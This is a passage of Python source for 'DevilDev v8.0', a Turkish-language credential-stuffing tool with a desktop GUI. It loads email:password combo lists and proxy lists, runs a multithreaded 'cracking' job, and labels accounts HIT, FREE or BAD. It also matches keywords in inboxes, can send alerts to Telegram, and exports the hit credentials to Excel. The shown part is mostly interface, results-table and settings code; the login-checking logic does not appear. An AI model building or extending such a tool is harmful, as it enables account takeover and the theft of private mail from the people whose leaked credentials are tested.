        json.dump(records, f, indent=2, ensure_ascii=False)

def export_excel(hit_data: list, filename: str):
    if not HAS_OPENPYXL:
        raise ImportError("openpyxl kurulu değil. 'pip install openpyxl' çalıştırın.")
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "DevilDev Results"

    headers = ["Tip", "Email", "Şifre", "Eşleşen Keyword", "Ad", "Ülke", "Doğum", "Inbox"]
    header_fill = PatternFill(start_color="1a1a2e", end_color="1a1a2e", fill_type="solid")
    header_font = Font(bold=True, color="ff003c", name="Consolas")

    for col, h in enumerate(headers, 1):
        cell = ws.cell(row=1, column=col, value=h)
        cell.fill = header_fill
        cell.font = header_font
        cell.alignment = Alignment(horizontal="center")

    type_colors = {"HIT": "00ff66", "FREE": "ffcc00", "BAD": "ff003c"}
    for row_idx, row in enumerate(hit_data, 2):
        for col, val in enumerate(row, 1):
            cell = ws.cell(row=row_idx, column=col, value=val)
            if col == 1:
                color = type_colors.get(str(val), "ffffff")
                cell.font = Font(bold=True, color=color, name="Consolas")

    # Sütun genişliği
    ws.column_dimensions["A"].width = 8
    ws.column_dimensions["B"].width = 35
    ws.column_dimensions["C"].width = 20
    ws.column_dimensions["D"].width = 35
    ws.column_dimensions["E"].width = 25
    ws.column_dimensions["F"].width = 10
    ws.column_dimensions["G"].width = 15
    ws.column_dimensions["H"].width = 10

    wb.save(filename)

# ============================================================
# Ana Uygulama v8.0
# ============================================================
class DevilDevApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.config_data = load_config()
        self.lang = self.config_data.get("language", "tr")
        self.text = LANGUAGES[self.lang]

        self.title(self.text["title"])
        # Kaydedilmiş pencere boyutu/konumunu uygula
        wx = self.config_data.get("window_x", 100)
        wy = self.config_data.get("window_y", 50)
        ww = self.config_data.get("window_width", 1450)
        wh = self.config_data.get("window_height", 980)
        self.geometry(f"{ww}x{wh}+{wx}+{wy}")
        self.configure(fg_color="#0a0a0a")
        self.resizable(True, True)
        self.minsize(1300, 850)

        self.color_theme = self.config_data.get("color_theme", "red")
        self.apply_color_theme()
        ctk.set_appearance_mode(self.config_data.get("theme", "Dark"))

        # Tk değişkenleri
        self.combo_file = tk.StringVar(value=self.config_data.get("combo_file", ""))
        self.keyword_file = tk.StringVar(value=self.config_data.get("keyword_file", ""))
        self.proxy_file = tk.StringVar(value=self.config_data.get("proxy_file", ""))
        self.thread_count = tk.IntVar(value=self.config_data.get("thread_count", 50))
        self.checkpoint_interval = tk.IntVar(value=self.config_data.get("checkpoint_interval", 50))
        self.max_retry = tk.IntVar(value=self.config_data.get("max_retry", 3))
        self.tg_token = tk.StringVar(value=self.config_data.get("tg_token", ""))
        self.tg_chat = tk.StringVar(value=self.config_data.get("tg_chat", ""))
        self.sound_enabled = tk.BooleanVar(value=self.config_data.get("sound", True))
        self.sound_choice = tk.StringVar(value=self.config_data.get("sound_choice", "beep"))
        self.log_to_file = tk.BooleanVar(value=self.config_data.get("log_to_file", False))
        self.checkpoint_enabled = tk.BooleanVar(value=self.config_data.get("checkpoint_enabled", True))
        self.tray_enabled = tk.BooleanVar(value=self.config_data.get("tray_enabled", True))

        # Durum
        self.running = False
        self.stop_event = asyncio.Event()  # asyncio event
        self._async_loop: asyncio.AbstractEventLoop | None = None
        self._async_thread: threading.Thread | None = None
        self.msg_queue: queue.Queue = queue.Queue()
        self.stats = Stats()
        self.notifier: TelegramNotifier | None = None
        self.total_combos = 0
        self.hit_data: list = []
        self.processed_count = 0
        self.current_combo_path = ""
        self.proxy_manager = ProxyManager()
        self._seen_combos: set = set()  # Duplicate kontrolü

        # Sayaçlar
        self.total_hits = 0
        self.total_free = 0
        self.total_bad = 0
        self.total_retry = 0
        self.total_dup = 0

        self.current_filter = "ALL"
        self.regex_filter = tk.StringVar(value="")
        self.search_query = tk.StringVar(value="")
        self.rotating_logger: RotatingLogger | None = None

        # Grafik
        self.fig = Figure(figsize=(6.5, 3.2), dpi=100, facecolor="#121212")
        self.ax1 = self.fig.add_subplot(121)
        self.ax2 = self.fig.add_subplot(122)
        for ax in (self.ax1, self.ax2):
            ax.set_facecolor("#1a1a1a")
            ax.tick_params(colors="#aaaaaa")
            ax.spines['bottom'].set_color('#555555')
            ax.spines['left'].set_color('#555555')
            ax.spines['top'].set_visible(False)
            ax.spines['right'].set_visible(False)
            ax.grid(color='#2a2a2a', linestyle='--', linewidth=0.5)

        self.line_hit, = self.ax1.plot([], [], label="Hit", color="#00ff66", linewidth=2.5)
        self.line_free, = self.ax1.plot([], [], label="Free", color="#ffcc00", linewidth=2.5)
        self.line_bad, = self.ax1.plot([], [], label="Bad", color="#ff003c", linewidth=2.5)
        self.ax1.legend(loc="upper left", facecolor="#1a1a1a", labelcolor="#ffffff", framealpha=0.8)
        self.ax1.set_title("Zaman Serisi", color="#ffffff", fontsize=10)

        self.line_rate, = self.ax2.plot([], [], label="Başarı %", color="#ff8800", linewidth=2.5)
        self.ax2.legend(loc="upper left", facecolor="#1a1a1a", labelcolor="#ffffff", framealpha=0.8)
        self.ax2.set_title("Başarı Oranı", color="#ffffff", fontsize=10)
        self.ax2.set_ylim(0, 100)
        self.fig.tight_layout(pad=1.5)

        self.create_widgets()
        self.update_gui()
        self.protocol("WM_DELETE_WINDOW", self.on_close)

        self.bind("<Control-Return>", lambda e: self.start_cracking())
        self.bind("<Control-s>", lambda e: self.stop_cracking())
        self.bind("<Control-o>", lambda e: self.browse_combo())
        self.bind("<Control-k>", lambda e: self.browse_keyword())

        self.tray_icon = None
        if self.tray_enabled.get() and HAS_TRAY:
            self.setup_tray()

        self.check_for_checkpoint()

    def apply_color_theme(self):
        themes = {
            "red":    {"fg": "#ff003c", "hover": "#cc0030", "light": "#ff3366"},
            "blue":   {"fg": "#0066ff", "hover": "#0044cc", "light": "#3399ff"},
            "green":  {"fg": "#00cc66", "hover": "#00994d", "light": "#33ff88"},
            "purple": {"fg": "#9b59b6", "hover": "#8e44ad", "light": "#bb77dd"}
        }
        self.primary_color = themes.get(self.color_theme, themes["red"])

    def setup_tray(self):
        try:
            image = Image.new('RGB', (64, 64), color='#0d0d0d')
            draw = ImageDraw.Draw(image)
            draw.ellipse((16, 16, 48, 48), fill='#ff003c')
            menu = pystray.Menu(
                pystray.MenuItem(self.text["tray_show"], self.show_window),
                pystray.MenuItem(self.text["tray_hide"], self.hide_window),
                pystray.MenuItem(self.text["tray_exit"], self.quit_app)
            )
            self.tray_icon = pystray.Icon("devildev", image, "DevilDev v8.0", menu)
            threading.Thread(target=self.tray_icon.run, daemon=True).start()
        except Exception:
            self.tray_icon = None

    def show_window(self):
        self.deiconify()
        self.lift()

    def hide_window(self):
        self.iconify()

    def quit_app(self):
        if self.tray_icon:
            self.tray_icon.stop()
        self.destroy()

    def on_close(self):
        # Pencere boyutu/konumunu kaydet
        self.config_data["window_x"] = self.winfo_x()
        self.config_data["window_y"] = self.winfo_y()
        self.config_data["window_width"] = self.winfo_width()
        self.config_data["window_height"] = self.winfo_height()
        self.save_config()
        if hasattr(self, 'tray_icon') and self.tray_icon:
            self.tray_icon.stop()
        if self._async_loop and self._async_loop.is_running():
            self._async_loop.call_soon_threadsafe(self._async_loop.stop)
        self.destroy()

    def save_config(self):
        self.config_data.update({
            "combo_file": self.combo_file.get(),
            "keyword_file": self.keyword_file.get(),
            "proxy_file": self.proxy_file.get(),
            "thread_count": self.thread_count.get(),
            "checkpoint_interval": self.checkpoint_interval.get(),
            "max_retry": self.max_retry.get(),
            "tg_token": self.tg_token.get(),
            "tg_chat": self.tg_chat.get(),
            "theme": ctk.get_appearance_mode(),
            "sound": self.sound_enabled.get(),
            "language": self.lang,
            "color_theme": self.color_theme,
            "sound_choice": self.sound_choice.get(),
            "log_to_file": self.log_to_file.get(),
            "checkpoint_enabled": self.checkpoint_enabled.get(),
            "tray_enabled": self.tray_enabled.get(),
        })
        save_config(self.config_data)

    def toggle_theme(self):
        new = "Dark" if ctk.get_appearance_mode() == "Light" else "Light"
        ctk.set_appearance_mode(new)
        self.save_config()

    def change_language(self, lang_code):
        self.lang = lang_code
        self.text = LANGUAGES[lang_code]
        self.title(self.text["title"])
        self.save_config()
        self.update_texts()

    def update_texts(self):
        try:
            self.lbl_combo.configure(text=self.text["combo_label"])
            self.lbl_keyword.configure(text=self.text["keyword_label"])
            self.lbl_proxy_list.configure(text=self.text["proxy_list_label"])
            self.lbl_checkpoint_interval.configure(text=self.text["checkpoint_interval_label"])
            self.lbl_retry.configure(text=self.text["retry_label"])
            self.start_btn.configure(text=self.text["start_btn"])
            self.stop_btn.configure(text=self.text["stop_btn"])
            self.export_btn.configure(text=self.text["export_btn"])
            self.filter_all.configure(text=self.text["filter_all"])
            self.filter_hit.configure(text=self.text["hit"])
            self.filter_free.configure(text=self.text["free"])
            self.filter_bad.configure(text=self.text["bad"])
            self.lbl_sound.configure(text=self.text["sound_label"])
            self.lbl_checkpoint.configure(text=self.text["checkpoint_label"])
            self.lbl_regex_filter.configure(text=self.text["filter_regex"])
            self.search_entry.configure(placeholder_text=self.text["search_placeholder"])
            self.lbl_proxy_stats.configure(text=self.proxy_manager.stats_text())
        except Exception:
            pass

    # ----------------------------------------------------------
    # Widget oluşturma
    # ----------------------------------------------------------
    def create_widgets(self):
        # Üst çubuk
        top_bar = ctk.CTkFrame(self, fg_color="transparent", height=70)
        top_bar.pack(fill="x", padx=25, pady=10)

        logo_text = (
            "██████╗ ███████╗██╗   ██╗██╗██╗\n"
            "██╔══██╗██╔════╝██║   ██║██║██║\n"
            "██║  ██║█████╗  ██║   ██║██║██║\n"
            "██║  ██║██╔══╝  ╚██╗ ██╔╝██║██║\n"
            "██████╔╝███████╗ ╚████╔╝ ██║███████╗\n"
            "╚═════╝ ╚══════╝  ╚═══╝  ╚═╝╚══════╝  v8.0"
        )
        ctk.CTkLabel(top_bar, text=logo_text, font=("Consolas", 10, "bold"),
                     text_color=self.primary_color["fg"]).pack(side="left")

        right_top = ctk.CTkFrame(top_bar, fg_color="transparent")
        right_top.pack(side="right")

        lang_menu = ctk.CTkOptionMenu(right_top, values=["tr", "en"],
                                      command=self.change_language, width=70)
        lang_menu.set(self.lang)
        lang_menu.pack(side="left", padx=5)

        ctk.CTkButton(right_top, text="🌓", width=40, command=self.toggle_theme,
                      fg_color="#333", hover_color="#555").pack(side="left", padx=5)

        ctk.CTkOptionMenu(right_top, values=["red", "blue", "green", "purple"],
                          command=self.change_color_theme, width=90).pack(side="left", padx=5)

        ctk.CTkCheckBox(right_top, text="🔊", variable=self.sound_enabled,
                        text_color="#ffffff", font=("Arial", 14)).pack(side="left", padx=5)

        ctk.CTkLabel(right_top, text="Ctrl+Enter Başlat",
                     font=("Arial", 9), text_color="#888").pack(side="left", padx=5)

        # Ana çerçeve
        main_frame = ctk.CTkFrame(self, fg_color="#121212", corner_radius=12)
        main_frame.pack(fill="both", expand=True, padx=25, pady=10)

        # SOL PANEL
        left_panel = ctk.CTkFrame(main_frame, fg_color="transparent", width=430)
        left_panel.pack(side="left", fill="y", padx=10, pady=10)
        left_panel.pack_propagate(False)

        self._build_left_panel(left_panel)

        # SAĞ PANEL
        right_panel = ctk.CTkFrame(main_frame, fg_color="transparent")
        right_panel.pack(side="left", fill="both", expand=True, padx=10, pady=10)

        self._build_right_panel(right_panel)

    def _build_left_panel(self, parent):
        # Dosya seçimi
        file_box = ctk.CTkFrame(parent, fg_color="#1e1e1e", corner_radius=10,
                                border_width=1, border_color="#333")
        file_box.pack(fill="x", pady=4)

        self.lbl_combo = ctk.CTkLabel(file_box, text=self.text["combo_label"],
                                      text_color="#dddddd", font=("Arial", 11, "bold"))
        self.lbl_combo.grid(row=0, column=0, sticky="w", padx=10, pady=5)
        ctk.CTkEntry(file_box, textvariable=self.combo_file, width=230,
                     fg_color="#0d0d0d", border_color=self.primary_color["fg"]).grid(row=0, column=1, padx=5)
        ctk.CTkButton(file_box, text="📂", width=38,
                      fg_color=self.primary_color["fg"], hover_color=self.primary_color["hover"],
                      command=self.browse_combo).grid(row=0, column=2, padx=4)

        self.lbl_keyword = ctk.CTkLabel(file_box, text=self.text["keyword_label"],
                                        text_color="#dddddd", font=("Arial", 11, "bold"))
        self.lbl_keyword.grid(row=1, column=0, sticky="w", padx=10, pady=5)
        ctk.CTkEntry(file_box, textvariable=self.keyword_file, width=230,
                     fg_color="#0d0d0d", border_color=self.primary_color["fg"]).grid(row=1, column=1, padx=5)
        ctk.CTkButton(file_box, text="📂", width=38,
                      fg_color=self.primary_color["fg"], hover_color=self.primary_color["hover"],
                      command=self.browse_keyword).grid(row=1, column=2, padx=4)

        # Proxy
        proxy_frame = ctk.CTkFrame(parent, fg_color="#1e1e1e", corner_radius=10,
                                   border_width=1, border_color="#333")
        proxy_frame.pack(fill="x", pady=4)

        self.lbl_proxy_list = ctk.CTkLabel(proxy_frame, text=self.text["proxy_list_label"],
                                           text_color="#dddddd", font=("Arial", 11, "bold"))
        self.lbl_proxy_list.grid(row=0, column=0, sticky="w", padx=10, pady=5)
        ctk.CTkEntry(proxy_frame, textvariable=self.proxy_file, width=230,
                     fg_color="#0d0d0d", border_color=self.primary_color["fg"]).grid(row=0, column=1, padx=5)
        ctk.CTkButton(proxy_frame, text="📂", width=38,
                      fg_color=self.primary_color["fg"], hover_color=self.primary_color["hover"],
                      command=self.browse_proxy).grid(row=0, column=2, padx=4)

        # Proxy istatistik etiketi
        self.lbl_proxy_stats = ctk.CTkLabel(proxy_frame, text="Proxy yüklü değil",
                                             text_color="#888", font=("Arial", 10))
        self.lbl_proxy_stats.grid(row=1, column=0, columnspan=3, sticky="w", padx=10, pady=2)

        # Ayarlar (thread, checkpoint, retry)
        settings_frame = ctk.CTkFrame(parent, fg_color="#1e1e1e", corner_radius=10,
                                      border_width=1, border_color="#333")
        settings_frame.pack(fill="x", pady=4)

        ctk.CTkLabel(settings_frame, text=self.text["threads_label"],
                     text_color="#dddddd", font=("Arial", 11, "bold")).grid(row=0, column=0, sticky="w", padx=10, pady=5)
        ctk.CTkButton(settings_frame, text="−", width=28, fg_color="#333", hover_color="#555",
                      command=lambda: self.thread_count.set(max(1, self.thread_count.get()-5))).grid(row=0, column=1, padx=2)
        ctk.CTkSlider(settings_frame, from_=1, to=200, variable=self.thread_count,
                      width=100, progress_color=self.primary_color["fg"]).grid(row=0, column=2, padx=5)
        ctk.CTkButton(settings_frame, text="+", width=28, fg_color="#333", hover_color="#555",
                      command=lambda: self.thread_count.set(min(200, self.thread_count.get()+5))).grid(row=0, column=3, padx=2)
        ctk.CTkLabel(settings_frame, textvariable=self.thread_count,
                     width=35, text_color="#ffffff").grid(row=0, column=4, padx=5)

        self.lbl_checkpoint_interval = ctk.CTkLabel(settings_frame, text=self.text["checkpoint_interval_label"],
                                                     text_color="#dddddd", font=("Arial", 11, "bold"))
        self.lbl_checkpoint_interval.grid(row=1, column=0, sticky="w", padx=10, pady=5)
        ctk.CTkEntry(settings_frame, textvariable=self.checkpoint_interval, width=70,
                     fg_color="#0d0d0d", border_color=self.primary_color["fg"]).grid(row=1, column=1, columnspan=2, padx=5)

        self.lbl_retry = ctk.CTkLabel(settings_frame, text=self.text["retry_label"],
                                      text_color="#dddddd", font=("Arial", 11, "bold"))
        self.lbl_retry.grid(row=1, column=3, sticky="w", padx=5)
        ctk.CTkEntry(settings_frame, textvariable=self.max_retry, width=55,
                     fg_color="#0d0d0d", border_color=self.primary_color["fg"]).grid(row=1, column=4, padx=4)

        # Ses
        sound_frame = ctk.CTkFrame(parent, fg_color="#1e1e1e", corner_radius=10,
                                   border_width=1, border_color="#333")
        sound_frame.pack(fill="x", pady=4)
        self.lbl_sound = ctk.CTkLabel(sound_frame, text=self.text["sound_label"],
                                      text_color="#dddddd", font=("Arial", 11, "bold"))
        self.lbl_sound.pack(side="left", padx=10, pady=5)
        ctk.CTkOptionMenu(sound_frame, values=["beep", "ding", "buzz", "silent"],
                          variable=self.sound_choice, width=110,
                          fg_color="#0d0d0d", button_color=self.primary_color["fg"]).pack(side="left", padx=8)

        # Misc
        misc_frame = ctk.CTkFrame(parent, fg_color="#1e1e1e", corner_radius=10,
                                  border_width=1, border_color="#333")
        misc_frame.pack(fill="x", pady=4)
        ctk.CTkButton(misc_frame, text="✏️ Combo", width=90, fg_color="#333", hover_color="#555",
                      command=self.open_combo_editor).pack(side="left", padx=8, pady=5)
        self.lbl_checkpoint = ctk.CTkLabel(misc_frame, text=self.text["checkpoint_label"],
                                           text_color="#dddddd", font=("Arial", 11))
        self.lbl_checkpoint.pack(side="left", padx=5)
        ctk.CTkCheckBox(misc_frame, variable=self.checkpoint_enabled, text="",
                        text_color="#ffffff").pack(side="left", padx=3)
        ctk.CTkCheckBox(misc_frame, text="Tepsi", variable=self.tray_enabled,
                        text_color="#ffffff", font=("Arial", 11)).pack(side="left", padx=8)

        # Telegram
        tg_frame = ctk.CTkFrame(parent, fg_color="#1e1e1e", corner_radius=10,
                                border_width=1, border_color="#333")
        tg_frame.pack(fill="x", pady=4)
        ctk.CTkLabel(tg_frame, text=self.text["telegram_token"],
                     text_color="#dddddd", font=("Arial", 11, "bold")).grid(row=0, column=0, sticky="w", padx=10, pady=4)
        ctk.CTkEntry(tg_frame, textvariable=self.tg_token, width=255,
                     fg_color="#0d0d0d", border_color=self.primary_color["fg"]).grid(row=0, column=1, padx=5, pady=4, columnspan=2)
        ctk.CTkLabel(tg_frame, text=self.text["telegram_chat"],
                     text_color="#dddddd", font=("Arial", 11, "bold")).grid(row=1, column=0, sticky="w", padx=10, pady=4)
        ctk.CTkEntry(tg_frame, textvariable=self.tg_chat, width=255,
                     fg_color="#0d0d0d", border_color=self.primary_color["fg"]).grid(row=1, column=1, padx=5, pady=4, columnspan=2)

        # Log dosyası
        ctk.CTkCheckBox(parent, text=self.text["log_to_file"], variable=self.log_to_file,
                        text_color="#dddddd", font=("Arial", 11)).pack(anchor="w", padx=15, pady=2)

        # Butonlar
        btn_box = ctk.CTkFrame(parent, fg_color="transparent")
        btn_box.pack(fill="x", pady=8)
        self.start_btn = ctk.CTkButton(btn_box, text=self.text["start_btn"],
                                       fg_color=self.primary_color["fg"],
                                       hover_color=self.primary_color["hover"],
                                       font=("Arial", 14, "bold"), height=45,
                                       corner_radius=8, command=self.start_cracking)
        self.start_btn.pack(fill="x", pady=4)
        self.stop_btn = ctk.CTkButton(btn_box, text=self.text["stop_btn"],
                                      fg_color="#444444", hover_color="#222222",
                                      font=("Arial", 13, "bold"), height=35,
                                      corner_radius=8, state="disabled", command=self.stop_cracking)
        self.stop_btn.pack(fill="x", pady=4)

        # Progress
        self.progress = ctk.CTkProgressBar(parent, progress_color=self.primary_color["fg"], corner_radius=6)
        self.progress.pack(fill="x", pady=4)
        self.progress.set(0)
        self.lbl_progress = ctk.CTkLabel(parent, text="0%", text_color="#aaaaaa", font=("Arial", 12))
        self.lbl_progress.pack(pady=2)

        info_row = ctk.CTkFrame(parent, fg_color="transparent")
        info_row.pack(fill="x", pady=2)
        self.lbl_speed = ctk.CTkLabel(info_row, text=f"{self.text['speed']} 0/s",
                                      text_color="#aaaaaa", font=("Arial", 11))
        self.lbl_speed.pack(side="left", padx=5)
        self.lbl_eta = ctk.CTkLabel(info_row, text=f"{self.text['eta']} ∞",
                                    text_color="#aaaaaa", font=("Arial", 11))
        self.lbl_eta.pack(side="right", padx=5)

        self.lbl_rate = ctk.CTkLabel(parent, text=f"{self.text['success_rate']} 0.0%",
                                     text_color="#ffcc00", font=("Arial", 13, "bold"))
        self.lbl_rate.pack(pady=4)

        # Export butonu (çoklu format)
        self.export_btn = ctk.CTkButton(parent, text=self.text["export_btn"],
                                        fg_color="#333333", hover_color="#555555",
                                        font=("Arial", 11), command=self.export_stats)
        self.export_btn.pack(fill="x", pady=4)

    def _build_right_panel(self, parent):
        # İstatistik kartları
        stats_grid = ctk.CTkFrame(parent, fg_color="transparent")
        stats_grid.pack(fill="x", pady=5)

        self.box_hit = self._stat_card(stats_grid, self.text["hit"], "0", "#00ff66", 0, 0)
        self.box_free = self._stat_card(stats_grid, self.text["free"], "0", "#ffcc00", 0, 1)
        self.box_bad = self._stat_card(stats_grid, self.text["bad"], "0", "#ff003c", 0, 2)
        self.box_retry = self._stat_card(stats_grid, self.text["retry"], "0", "#00ccff", 0, 3)
        self.box_dup = self._stat_card(stats_grid, "DUP", "0", "#aa44aa", 0, 4)
        self.box_total = self._stat_card(stats_grid, self.text["total"], "0", "#aaaaaa", 1, 0)
        self.box_cpm = self._stat_card(stats_grid, self.text["cpm"], "0", "#ffffff", 1, 1)
        self.box_success = self._stat_card(stats_grid, self.text["success_rate"], "0%", "#ff8800", 1, 2)
        self.box_status = self._stat_card(stats_grid, self.text["status"], self.text["ready"], "#00ccff", 1, 3)
        self.box_proxy = self._stat_card(stats_grid, "Proxy", "—", "#ffaa00", 1, 4)

        # Grafik
        canvas_frame = ctk.CTkFrame(parent, fg_color="#1a1a1a", corner_radius=10,
                                    border_width=1, border_color="#333")
        canvas_frame.pack(fill="both", expand=False, pady=5)
        self.canvas = FigureCanvasTkAgg(self.fig, master=canvas_frame)
        self.canvas.get_tk_widget().pack(fill="both", expand=True, padx=5, pady=5)

        # Alt alan: Filtre + Tablo + Detay + Log
        bottom = ctk.CTkFrame(parent, fg_color="transparent")
        bottom.pack(fill="both", expand=True, pady=5)

        # Filtre çubuğu
        filter_row = ctk.CTkFrame(bottom, fg_color="transparent")
        filter_row.pack(fill="x", pady=2)

        self.lbl_regex_filter = ctk.CTkLabel(filter_row, text=self.text["filter_regex"],
                                              text_color="#dddddd", font=("Arial", 11))
        self.lbl_regex_filter.pack(side="left", padx=5)
        regex_entry = ctk.CTkEntry(filter_row, textvariable=self.regex_filter, width=140,
                                   placeholder_text=self.text["filter_placeholder"],
                                   fg_color="#0d0d0d", border_color="#555")
        regex_entry.pack(side="left", padx=5)
        regex_entry.bind("<KeyRelease>", lambda e: self.update_table())

        ctk.CTkLabel(filter_row, text="Tip:", text_color="#dddddd",
                     font=("Arial", 11)).pack(side="left", padx=8)

        self.filter_all = ctk.CTkButton(filter_row, text=self.text["filter_all"], width=55,
                                        fg_color="#333", hover_color="#555",
                                        command=lambda: self.set_filter("ALL"))
        self.filter_all.pack(side="left", padx=2)
        self.filter_hit = ctk.CTkButton(filter_row, text=self.text["hit"], width=50,
                                        fg_color="#333", hover_color="#555",
                                        command=lambda: self.set_filter("HIT"))
        self.filter_hit.pack(side="left", padx=2)
        self.filter_free = ctk.CTkButton(filter_row, text=self.text["free"], width=50,
                                         fg_color="#333", hover_color="#555",
                                         command=lambda: self.set_filter("FREE"))
        self.filter_free.pack(side="left", padx=2)
        self.filter_bad = ctk.CTkButton(filter_row, text=self.text["bad"], width=50,
                                        fg_color="#333", hover_color="#555",
                                        command=lambda: self.set_filter("BAD"))
        self.filter_bad.pack(side="left", padx=2)

        ctk.CTkLabel(filter_row, text="🔍", text_color="#dddddd",
                     font=("Arial", 14)).pack(side="left", padx=8)
        self.search_entry = ctk.CTkEntry(filter_row, textvariable=self.search_query, width=150,
                                         placeholder_text=self.text["search_placeholder"],
                                         fg_color="#0d0d0d", border_color="#555")
        self.search_entry.pack(side="left", padx=5)
        self.search_entry.bind("<KeyRelease>", lambda e: self.update_table())

        # Tablo + Detay + Log yatay
        table_area = ctk.CTkFrame(bottom, fg_color="transparent")
        table_area.pack(fill="both", expand=True, pady=4)

        self._build_table(table_area)
        self._build_detail_panel(table_area)
        self._build_log(table_area)

    def _stat_card(self, parent, title, value, color, row, col):
        card = ctk.CTkFrame(parent, fg_color="#1a1a1a", corner_radius=10,
                            width=145, height=75, border_width=1, border_color="#333")
        card.grid(row=row, column=col, padx=5, pady=5)
        card.grid_propagate(False)

        def on_enter(e): card.configure(border_color=color, fg_color="#252525")
        def on_leave(e): card.configure(border_color="#333", fg_color="#1a1a1a")
        card.bind("<Enter>", on_enter)
        card.bind("<Leave>", on_leave)

        ctk.CTkLabel(card, text=title, font=("Arial", 10, "bold"),
                     text_color="#888888").pack(anchor="w", padx=8, pady=2)
        lbl = ctk.CTkLabel(card, text=value, font=("Arial", 19, "bold"), text_color=color)
        lbl.pack(anchor="w", padx=8)
        return lbl

    def _build_table(self, parent):
        tframe = ctk.CTkFrame(parent, fg_color="#1a1a1a", corner_radius=10,
                              border_width=1, border_color="#333")
        tframe.pack(side="left", fill="both", expand=True, padx=4)

        ctk.CTkLabel(tframe, text=self.text["results_table"],
                     font=("Arial", 12, "bold"),
                     text_color=self.primary_color["fg"]).pack(anchor="w", padx=10, pady=2)

        inner = tk.Frame(tframe, bg="#1a1a1a")
        inner.pack(fill="both", expand=True, padx=5, pady=5)

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background="#1a1a1a", foreground="#ffffff",
                        fieldbackground="#1a1a1a", rowheight=24)
        style.map("Treeview", background=[("selected", self.primary_color["fg"])])
        style.configure("Treeview.Heading", background="#2a2a2a", foreground="#ffffff",
                        font=("Arial", 10, "bold"))

        self.tree = ttk.Treeview(inner,
                                  columns=("Type", "Email", "Password", "Match"),
                                  show="headings", height=10)
        self.tree.heading("Type", text="Tip")
        self.tree.heading("Email", text="Email")
        self.tree.heading("Password", text="Şifre")
        self.tree.heading("Match", text="Keyword Eşleşme")
        self.tree.column("Type", width=55, anchor="center")
        self.tree.column("Email", width=195)
        self.tree.column("Password", width=115)
        self.tree.column("Match", width=200)
        self.tree.pack(side="left", fill="both", expand=True)

        # Satır renkleri
        self.tree.tag_configure("HIT", foreground="#00ff66")
        self.tree.tag_configure("FREE", foreground="#ffcc00")
        self.tree.tag_configure("BAD", foreground="#ff5555")

        for col in ("Type", "Email", "Password", "Match"):
            self.tree.heading(col, command=lambda c=col: self.sort_tree(c))

        scroll = ttk.Scrollbar(inner, orient="vertical", command=self.tree.yview)
        scroll.pack(side="right", fill="y")
        self.tree.configure(yscrollcommand=scroll.set)

        # Tıklama → detay paneli
        self.tree.bind("<<TreeviewSelect>>", self.on_row_select)

        # Sağ tık menüsü
        self.tree_menu = tk.Menu(self.tree, tearoff=0, bg="#2a2a2a", fg="#ffffff")
        self.tree_menu.add_command(label=self.text["copy_email"], command=self.copy_email)
        self.tree_menu.add_command(label=self.text["copy_password"], command=self.copy_password)
        self.tree_menu.add_command(label=self.text["copy_row"], command=self.copy_row)
        self.tree_menu.add_separator()
        self.tree_menu.add_command(label=self.text["delete_row"], command=self.delete_row)
        self.tree.bind("<Button-3>", self.show_tree_menu)

    def _build_detail_panel(self, parent):
        """Seçili satırın profil detaylarını gösteren panel"""
        dpanel = ctk.CTkFrame(parent, fg_color="#1a1a1a", corner_radius=10,
                              border_width=1, border_color="#333", width=200)
        dpanel.pack(side="left", fill="y", padx=4)
        dpanel.pack_propagate(False)

        ctk.CTkLabel(dpanel, text=self.text["detail_panel"],
                     font=("Arial", 12, "bold"),
                     text_color=self.primary_color["fg"]).pack(anchor="w", padx=10, pady=4)

        self.detail_text = ctk.CTkTextbox(dpanel, fg_color="#0d0d0d",
                                          text_color="#dddddd",
                                          font=("Consolas", 10), corner_radius=5)
        self.detail_text.pack(fill="both", expand=True, padx=6, pady=6)
        self.detail_text.configure(state="disabled")
        self._detail_cache: dict = {}  # email → profil bilgisi

    def _build_log(self, parent):
        log_frame = ctk.CTkFrame(parent, fg_color="#1a1a1a", corner_radius=10,
                                 border_width=1, border_color="#333")
        log_frame.pack(side="left", fill="both", expand=True, padx=4)

        log_header = ctk.CTkFrame(log_frame, fg_color="transparent")
        log_header.pack(fill="x", padx=5, pady=2)
        ctk.CTkLabel(log_header, text=self.text["live_log"],
                     font=("Consolas", 12, "bold"),
                     text_color=self.primary_color["fg"]).pack(side="left")
        ctk.CTkButton(log_header, text=self.text["clear"], width=75,
                      fg_color="#333333", hover_color="#555555",
                      command=self.clear_log).pack(side="right")

        self.log_box = ctk.CTkTextbox(log_frame, fg_color="#0d0d0d",
                                      text_color="#00ff66",
                                      font=("Consolas", 9), corner_radius=5)
        self.log_box.pack(fill="both", expand=True, padx=5, pady=5)
        self.log_box.configure(state="disabled")
        self.log_box.tag_config("hit", foreground="#00ff66")
        self.log_box.tag_config("free", foreground="#ffcc00")
        self.log_box.tag_config("bad", foreground="#ff5555")
        self.log_box.tag_config("info", foreground="#00ccff")
        self.log_box.tag_config("retry", foreground="#ff8800")
        self.log_box.tag_config("checkpoint", foreground="#ff8800")
        self.log_box.tag_config("dup", foreground="#aa44aa")
        self.log_box.tag_config("err", foreground="#ff4444")

        self.rotating_logger = RotatingLogger() if self.log_to_file.get() else None

    # ----------------------------------------------------------
    # Yardımcı metodlar
    # ----------------------------------------------------------
    def browse_combo(self):
        f = filedialog.askopenfilename(title="Combo Dosyası",
                                       filetypes=[("Text", "*.txt"), ("Tümü", "*.*")])
        if f:
            self.combo_file.set(f)
            self.current_combo_path = f

    def browse_keyword(self):
        f = filedialog.askopenfilename(title="Keyword Dosyası",
                                       filetypes=[("Text", "*.txt"), ("Tümü", "*.*")])
        if f:
            self.keyword_file.set(f)

    def browse_proxy(self):
        f = filedialog.askopenfilename(title="Proxy Listesi",
                                       filetypes=[("Text", "*.txt"), ("Tümü", "*.*")])
        if f:
            self.proxy_file.set(f)
            self.proxy_manager.load(f)
            self.lbl_proxy_stats.configure(text=self.proxy_manager.stats_text())
            self.log(f"[INFO] Proxy yüklendi: {self.proxy_manager.stats_text()}", "info")

    def clear_log(self):
        self.log_box.configure(state="normal")
        self.log_box.delete("1.0", "end")
        self.log_box.configure(state="disabled")

    def log(self, message: str, tag: str = None):
        """UI thread'den veya queue üzerinden çağrılır"""
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_box.configure(state="normal")
        if tag:
            self.log_box.insert("end", f"[{ts}] {message}\n", tag)
        else:
